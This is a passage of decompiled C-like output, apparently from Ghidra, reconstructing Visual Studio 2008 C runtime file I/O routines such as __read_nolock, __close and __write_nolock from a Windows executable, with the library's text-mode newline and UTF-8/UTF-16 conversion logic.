            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_00425788 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  piVar6 = &DAT_004257a0 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + iVar14 + 4);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_0040f674;
  }
  if (_MaxCharCount < 0x80000000) {
    local_14 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + iVar14 + 0x24) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_0040f662;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        local_10 = (short *)__malloc_crt(_MaxCharCount);
        if (local_10 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_0040f662;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_10 = (short *)_DstBuf;
      }
      psVar8 = local_10;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        *(char *)local_10 = cVar4;
        psVar8 = (short *)((int)local_10 + 1);
        uVar7 = _MaxCharCount - 1;
        local_14 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = local_10 + 1;
          uVar7 = _MaxCharCount - 2;
          local_14 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)local_10 + 3);
            local_14 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_0040f981;
          }
          goto LAB_0040f976;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_14 = (short *)((int)local_14 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_0040f981;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*local_10 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_14 = (short *)((int)local_14 + (int)local_10);
          _MaxCharCount = (uint)local_10;
          psVar8 = local_10;
          if (local_10 < local_14) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar8 = *(short *)_MaxCharCount;
                  psVar8 = psVar8 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_14 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_0040fa24;
                  }
LAB_0040fab7:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_0040fab9:
                  *psVar8 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_0040fab7;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar8 == local_10) && (local_c == 10)) goto LAB_0040fa24;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_0040fabf;
                    goto LAB_0040fab7;
                  }
                  if (local_c == 10) {
LAB_0040fa24:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_0040fab9;
                  }
                  *psVar8 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar8 = sVar17;
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_0040fabf:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_14);
          }
          local_14 = (short *)((int)psVar8 - (int)local_10);
          goto LAB_0040f981;
        }
        if ((local_1c == 0) || (*(char *)local_10 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_14 = (short *)((int)local_14 + (int)local_10);
        _MaxCharCount = (uint)local_10;
        psVar8 = local_10;
        if (local_10 < local_14) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar8 = *(undefined *)_MaxCharCount;
                psVar8 = (short *)((int)psVar8 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_14 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_0040f801;
                }
LAB_0040f878:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar8 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_0040f878;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar8 == local_10) && (local_5 == '\n')) goto LAB_0040f801;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_0040f87c;
                  goto LAB_0040f878;
                }
                if (local_5 == '\n') {
LAB_0040f801:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar8 = 10;
                }
                else {
                  *(undefined *)psVar8 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar8 = cVar4;
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_0040f87c:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_14);
        }
        local_14 = (short *)((int)psVar8 - (int)local_10);
        if ((local_6 != '\x01') || (local_14 == (short *)0x0)) goto LAB_0040f981;
        bVar3 = *(byte *)(short *)((int)psVar8 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar8 = (short *)((int)psVar8 + -1);
          while ((((&DAT_00422668)[bVar3] == '\0' && (iVar13 < 5)) && (local_10 <= psVar8))) {
            psVar8 = (short *)((int)psVar8 + -1);
            bVar3 = *(byte *)psVar8;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_00422668)[*(byte *)psVar8] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_0040f97d;
          }
          if ((char)(&DAT_00422668)[*(byte *)psVar8] + 1 == iVar13) {
            psVar8 = (short *)((int)psVar8 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar12 = (short *)((int)psVar8 + 1);
            *(byte *)(*piVar6 + iVar14 + 5) = *(byte *)psVar8;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar12;
              psVar12 = psVar8 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar12;
              psVar12 = (short *)((int)psVar12 + 1);
            }
            psVar8 = (short *)((int)psVar12 - iVar13);
          }
        }
        iVar13 = (int)psVar8 - (int)local_10;
        local_14 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_14 != (short *)0x0) {
          bVar15 = local_14 != (short *)iVar13;
          local_14 = (short *)((int)local_14 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_0040f981;
        }
        uVar11 = GetLastError();
LAB_0040f976:
        __dosmaperr(uVar11);
      }
LAB_0040f97d:
      local_18 = -1;
LAB_0040f981:
      if (local_10 != (short *)_DstBuf) {
        _free(local_10);
      }
      if (local_18 == -2) {
        return (int)local_14;
      }
      return local_18;
    }
  }
LAB_0040f662:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_0040f674:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2008 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425788)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_0040fc1f();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_0040fb7b;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_0040fb7b:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



void FUN_0040fc1f(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_004257a0 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_004257a0 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_0040fc8f;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0040fc91;
    }
  }
LAB_0040fc8f:
  DVar4 = 0;
LAB_0040fc91:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2008 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425788)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_0040fd88();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040fd88(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040fde9:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_0040fde9;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_0040d3ff(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_0040d3ff(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_00422448;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_004257a0)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_0040ff11;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_0040ff11:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  WCHAR WVar1;
  wint_t wVar2;
  ulong *puVar3;
  int *piVar4;
  int iVar5;
  _ptiddata p_Var6;
  BOOL BVar7;
  DWORD nNumberOfBytesToWrite;
  int iVar8;
  uint uVar9;
  char cVar10;
  WCHAR *pWVar11;
  char *pcVar12;
  int unaff_EDI;
  WCHAR *pWVar13;
  ushort uVar14;
  UINT local_1ae8;
  uint local_1ae4;
  char local_1add;
  int *local_1adc;
  char *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  char *local_1acc;
  WCHAR *local_1ac8;
  DWORD local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = (char *)0x0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_0041064d;
  if (_Buf == (void *)0x0) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041064d;
  }
  piVar4 = &DAT_004257a0 + (_FileHandle >> 5);
  iVar8 = (_FileHandle & 0x1fU) * 0x40;
  cVar10 = (char)(*(char *)(*piVar4 + iVar8 + 0x24) * '\x02') >> 1;
  local_1add = cVar10;
  local_1adc = piVar4;
  if (((cVar10 == '\x02') || (cVar10 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041064d;
  }
  if ((*(byte *)(*piVar4 + iVar8 + 4) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  }
  iVar5 = __isatty(_FileHandle);
  if ((iVar5 == 0) || ((*(byte *)(iVar8 + 4 + *piVar4) & 0x80) == 0)) {
LAB_004102be:
    if ((*(byte *)((HANDLE *)(*piVar4 + iVar8) + 1) & 0x80) == 0) {
      BVar7 = WriteFile(*(HANDLE *)(*piVar4 + iVar8),local_1ad0,_MaxCharCount,(LPDWORD)&local_1ad8,
                        (LPOVERLAPPED)0x0);
      if (BVar7 == 0) {
LAB_004105be:
        local_1ac4 = GetLastError();
      }
      else {
        local_1ac4 = 0;
        local_1acc = local_1ad8;
      }
LAB_004105ca:
      if (local_1acc != (char *)0x0) goto LAB_0041064d;
      goto LAB_004105d3;
    }
    local_1ac4 = 0;
    if (cVar10 == '\0') {
      local_1ac8 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_0041060f;
      do {
        local_1ac0 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac8 - (int)local_1ad0;
        pWVar11 = local_1abc;
        do {
          if (_MaxCharCount <= uVar9) break;
          pWVar13 = (WCHAR *)((int)local_1ac8 + 1);
          cVar10 = *(char *)local_1ac8;
          uVar9 = uVar9 + 1;
          if (cVar10 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar11 = '\r';
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          *(char *)pWVar11 = cVar10;
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          local_1ac8 = pWVar13;
        } while (local_1ac0 < (WCHAR *)0x13ff);
        BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                          (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
        if (BVar7 == 0) goto LAB_004105be;
        local_1acc = local_1acc + (int)local_1ad8;
      } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
              (piVar4 = local_1adc, (uint)((int)local_1ac8 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_004105ca;
    }
    local_1ac0 = local_1ad0;
    if (cVar10 == '\x02') {
      if (_MaxCharCount != 0) {
        do {
          local_1ac8 = (WCHAR *)0x0;
          uVar9 = (int)local_1ac0 - (int)local_1ad0;
          pWVar11 = local_1abc;
          do {
            if (_MaxCharCount <= uVar9) break;
            pWVar13 = local_1ac0 + 1;
            WVar1 = *local_1ac0;
            uVar9 = uVar9 + 2;
            if (WVar1 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar11 = L'\r';
              pWVar11 = pWVar11 + 1;
              local_1ac8 = local_1ac8 + 1;
            }
            local_1ac8 = local_1ac8 + 1;
            *pWVar11 = WVar1;
            pWVar11 = pWVar11 + 1;
            local_1ac0 = pWVar13;
          } while (local_1ac8 < (WCHAR *)0x13fe);
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_004105be;
          local_1acc = local_1acc + (int)local_1ad8;
        } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
                (piVar4 = local_1adc, (uint)((int)local_1ac0 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_004105ca;
      }
    }
    else if (_MaxCharCount != 0) {
      do {
        local_1ac8 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac0 - (int)local_1ad0;
        pWVar11 = local_6bc;
        do {
          if (_MaxCharCount <= uVar9) break;
          WVar1 = *local_1ac0;
          local_1ac0 = local_1ac0 + 1;
          uVar9 = uVar9 + 2;
          if (WVar1 == L'\n') {
            *pWVar11 = L'\r';
            pWVar11 = pWVar11 + 1;
            local_1ac8 = local_1ac8 + 1;
          }
          local_1ac8 = local_1ac8 + 1;
          *pWVar11 = WVar1;
          pWVar11 = pWVar11 + 1;
        } while (local_1ac8 < (WCHAR *)0x6a8);
        pcVar12 = (char *)0x0;
        iVar5 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar11 - (int)local_6bc) / 2,
                                    local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar5 == 0) goto LAB_004105be;
        do {
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),local_1414 + (int)pcVar12,
                            iVar5 - (int)pcVar12,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) {
            local_1ac4 = GetLastError();
            break;
          }
          pcVar12 = pcVar12 + (int)local_1ad8;
        } while ((int)pcVar12 < iVar5);
      } while ((iVar5 <= (int)pcVar12) &&
              (local_1acc = (char *)((int)local_1ac0 - (int)local_1ad0), local_1acc < _MaxCharCount)
              );
      goto LAB_004105ca;
    }
  }
  else {
    p_Var6 = __getptd();
    local_1ae4 = (uint)(p_Var6->ptlocinfo->lc_category[0].wlocale == (wchar_t *)0x0);
    BVar7 = GetConsoleMode(*(HANDLE *)(iVar8 + *piVar4),&local_1ae8);
    if ((BVar7 == 0) || ((local_1ae4 != 0 && (cVar10 == '\0')))) goto LAB_004102be;
    local_1ae8 = GetConsoleCP();
    local_1ac8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac0 = (WCHAR *)0x0;
      pWVar11 = local_1ad0;
      do {
        piVar4 = local_1adc;
        if (local_1add == '\0') {
          cVar10 = *(char *)pWVar11;
          local_1ae4 = (uint)(cVar10 == '\n');
          iVar5 = *local_1adc + iVar8;
          if (*(int *)(iVar5 + 0x38) == 0) {
            iVar5 = _isleadbyte(CONCAT22(cVar10 >> 7,(short)cVar10));
            if (iVar5 == 0) {
              uVar14 = 1;
              pWVar13 = pWVar11;
              goto LAB_00410125;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar11)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar8 + 0x34 + *piVar4) = *(undefined *)pWVar11;
              *(undefined4 *)(iVar8 + 0x38 + *piVar4) = 1;
              break;
            }
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar11,2);
            if (iVar5 == -1) break;
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar5 + 0x34);
            *(undefined4 *)(iVar5 + 0x38) = 0;
            uVar14 = 2;
            pWVar13 = &local_10;
            local_10._1_1_ = cVar10;
LAB_00410125:
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar13,(uint)uVar14);
            if (iVar5 == -1) break;
          }
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          nNumberOfBytesToWrite =
               WideCharToMultiByte(local_1ae8,0,(LPCWSTR)&local_1ac4,1,(LPSTR)&local_10,5,
                                   (LPCSTR)0x0,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ac8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_004105be;
          local_1acc = (char *)((int)local_1ac0 + local_1ad4);
          if ((int)local_1ac8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae4 != 0) {
            local_10._0_1_ = '\r';
            BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,1,(LPDWORD)&local_1ac8,
                              (LPOVERLAPPED)0x0);
            if (BVar7 == 0) goto LAB_004105be;
            if ((int)local_1ac8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            local_1ac4 = (DWORD)(ushort)*pWVar11;
            local_1ae4 = (uint)(*pWVar11 == L'\n');
